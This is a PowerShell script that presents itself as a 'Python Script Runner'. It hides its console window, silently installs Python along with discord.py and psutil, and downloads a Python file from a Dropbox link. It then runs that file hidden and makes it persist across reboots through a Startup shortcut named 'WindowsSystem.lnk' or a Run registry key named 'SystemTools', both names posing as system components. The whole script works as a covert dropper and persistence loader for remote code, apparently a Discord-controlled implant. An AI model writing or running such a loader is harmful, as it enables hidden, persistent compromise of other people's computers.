# Python Script Runner with Startup Persistence - Windows 10/11 Compatible
# Save as .ps1 file and run

# Simple window hiding that works on all Windows versions
try {
    $signature = @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
'@
    $type = Add-Type -MemberDefinition $signature -Name "Win32" -Namespace Win32Functions -PassThru
    $consolePtr = $type::GetConsoleWindow()
    $type::ShowWindow($consolePtr, 0)  # 0 = hide window
} catch {
    # Continue silently if hiding fails
}

# Function to check if Python is installed - FIXED
function Test-Python {
    try {
        # Try to actually run Python and get version
        $pythonVersion = python --version 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Python found: $pythonVersion" -ForegroundColor Green
            return $true
        }
    } catch {
        # Continue to next check
    }
    
    try {
        # Try python3
        $pythonVersion = python3 --version 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Python found: $pythonVersion" -ForegroundColor Green
            return $true
        }
    } catch {
        # Continue to next check
    }
    
    # Check common Python installation paths
    $pythonPaths = @(
        "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python310\python.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python39\python.exe",
        "$env:APPDATA\Python\Python311\python.exe",
        "$env:APPDATA\Python\Python310\python.exe",
        "$env:USERPROFILE\AppData\Local\Programs\Python\Python311\python.exe"
    )
    
    foreach ($path in $pythonPaths) {
        if (Test-Path $path) {
            Write-Host "Python found at: $path" -ForegroundColor Green
            return $true
        }
    }
    
    Write-Host "Python not found on system" -ForegroundColor Red
    return $false
}

# Function to install Python silently - IMPROVED
function Install-Python {
    Write-Host "Installing portable Python..." -ForegroundColor Yellow
    
    # Use a reliable Python version
    $pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-embed-amd64.zip"
    $downloadPath = "$env:TEMP\python_setup.zip"
    $extractPath = "$env:LOCALAPPDATA\Python310"
    
    try {
        # Download Python
        Write-Host "Downloading Python from $pythonUrl" -ForegroundColor Yellow
        Invoke-WebRequest -Uri $pythonUrl -OutFile $downloadPath -UseBasicParsing
        
        # Extract to persistent location
        Write-Host "Extracting Python to $extractPath" -ForegroundColor Yellow
        if (Test-Path $extractPath) {
            Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
        }
        New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
        Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force
        
        # Fix python._pth to allow imports
        $pthFile = Get-ChildItem -Path $extractPath -Filter "*.pth" | Select-Object -First 1
        if ($pthFile) {
            Write-Host "Configuring Python environment..." -ForegroundColor Yellow
            Add-Content -Path $pthFile.FullName -Value "import site"
        }
        
        # Test if Python works
        $pythonExe = "$extractPath\python.exe"
        if (Test-Path $pythonExe) {
            $testProcess = Start-Process -FilePath $pythonExe -ArgumentList "--version" -Wait -PassThru -WindowStyle Hidden
            if ($testProcess.ExitCode -eq 0) {
                Write-Host "Python installed successfully at: $extractPath" -ForegroundColor Green
                return $extractPath
            }
        }
        
        Write-Host "Python installation verification failed" -ForegroundColor Red
        return $null
    } catch {
        Write-Host "Failed to install Python: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

# Function to install pip and dependencies - IMPROVED
function Install-Deps {
    param($PythonPath)
    
    $pythonExe = "$PythonPath\python.exe"
    
    try {
        # Download get-pip.py
        Write-Host "Installing pip..." -ForegroundColor Yellow
        $getPipUrl = "https://bootstrap.pypa.io/get-pip.py"
        $getPipPath = "$PythonPath\get-pip.py"
        
        Invoke-WebRequest -Uri $getPipUrl -OutFile $getPipPath -UseBasicParsing
        
        # Install pip
        $process = Start-Process -FilePath $pythonExe -ArgumentList $getPipPath -Wait -PassThru -WindowStyle Hidden
        if ($process.ExitCode -ne 0) {
            Write-Host "Pip installation failed, trying alternative method..." -ForegroundColor Yellow
            # Try alternative method
            Start-Process -FilePath $pythonExe -ArgumentList "-m", "ensurepip", "--default-pip" -Wait -WindowStyle Hidden
        }
        
        # Install required packages
        Write-Host "Installing Python packages..." -ForegroundColor Yellow
        $packages = @("discord.py", "psutil")
        foreach ($pkg in $packages) {
            Write-Host "Installing $pkg..." -ForegroundColor Yellow
            $process = Start-Process -FilePath $pythonExe -ArgumentList "-m", "pip", "install", $pkg, "--quiet" -Wait -PassThru -WindowStyle Hidden
            if ($process.ExitCode -ne 0) {
                Write-Host "Failed to install $pkg, but continuing..." -ForegroundColor Red
            }
        }
        return $true
    } catch {
        Write-Host "Dependency installation had issues: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to add to startup (works on Win 10/11)
function Add-Startup {
    param($PythonCmd, $ScriptPath)
    
    Write-Host "Setting up startup persistence..." -ForegroundColor Yellow
    
    # Method 1: Startup folder (most reliable, no admin needed)
    try {
        $startupPath = [Environment]::GetFolderPath("Startup")
        $shortcutPath = "$startupPath\WindowsSystem.lnk"
        
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut($shortcutPath)
        $Shortcut.TargetPath = "cmd.exe"
        $Shortcut.Arguments = "/c `"$PythonCmd` `"$ScriptPath`""
        $Shortcut.WindowStyle = 7  # Minimized
        $Shortcut.WorkingDirectory = "$env:USERPROFILE"
        $Shortcut.Save()
        Write-Host "Startup shortcut created successfully" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Startup folder method failed: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # Method 2: Registry (fallback)
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "SystemTools"
        $regValue = "cmd.exe /c `"$PythonCmd` `"$ScriptPath`""
        
        New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
        Write-Host "Registry startup entry added" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Registry method failed: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    return $false
}

# Main execution - FIXED LOGIC
try {
    # Check if Python is available - PROPERLY
    $pythonFound = Test-Python
    
    if ($pythonFound) {
        Write-Host "Using existing Python installation" -ForegroundColor Green
        $pythonCmd = "python"
    } else {
        Write-Host "No Python found, installing portable version..." -ForegroundColor Yellow
        $pythonPath = Install-Python
        
        if ($pythonPath -and (Test-Path "$pythonPath\python.exe")) {
            Write-Host "Portable Python installed successfully" -ForegroundColor Green
            Write-Host "Installing dependencies..." -ForegroundColor Yellow
            $depsResult = Install-Deps -PythonPath $pythonPath
            $pythonCmd = "`"$pythonPath\python.exe`""
            Write-Host "Using portable Python: $pythonCmd" -ForegroundColor Green
        } else {
            Write-Host "CRITICAL: Python installation completely failed!" -ForegroundColor Red
            Write-Host "Trying last resort with system Python..." -ForegroundColor Yellow
            $pythonCmd = "python"
        }
    }
    
    # Download the main script
    Write-Host "Downloading main script..." -ForegroundColor Yellow
    
    $scriptUrl = "https://www.dropbox.com/scl/fi/5tz22k0sppp1jh9x9drhv/ProcessManager.py?rlkey=a1xn2hxrh7u6b52rr4id4yp6d&st=vzuethzw&dl=1"
    $scriptPath = "$env:USERPROFILE\ProcessManager.py"
    
    # Download the script
    try {
        Write-Host "Downloading from: $scriptUrl" -ForegroundColor Yellow
        Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -UseBasicParsing
        Write-Host "Script downloaded to: $scriptPath" -ForegroundColor Green
    } catch {
        Write-Host "Failed to download script: $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
    
    if (Test-Path $scriptPath) {
        Write-Host "Attempting to run script with: $pythonCmd" -ForegroundColor Yellow
        
        # Test if Python command actually works
        try {
            Write-Host "Testing Python command..." -ForegroundColor Yellow
            $testProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "$pythonCmd --version" -Wait -PassThru -WindowStyle Hidden
            if ($testProcess.ExitCode -eq 0) {
                Write-Host "Python test successful! Running main script..." -ForegroundColor Green
                # Run the script hidden
                Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "$pythonCmd `"$scriptPath`" & exit" -WindowStyle Hidden
                Write-Host "Script started successfully!" -ForegroundColor Green
                
                # Add to startup
                if (Add-Startup -PythonCmd $pythonCmd -ScriptPath $scriptPath) {
                    Write-Host "Startup persistence configured!" -ForegroundColor Green
                } else {
                    Write-Host "Failed to configure startup, but script is running" -ForegroundColor Yellow
                }
            } else {
                Write-Host "Python command test failed! Exit code: $($testProcess.ExitCode)" -ForegroundColor Red
                Write-Host "Cannot run script without working Python" -ForegroundColor Red
            }
        } catch {
            Write-Host "Failed to run script: $($_.Exception.Message)" -ForegroundColor Red
        }
    } else {
        Write-Host "Script file not found after download" -ForegroundColor Red
    }
    
} catch {
    Write-Host "Unexpected error: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "Script execution completed" -ForegroundColor Yellow
Start-Sleep -Seconds 5
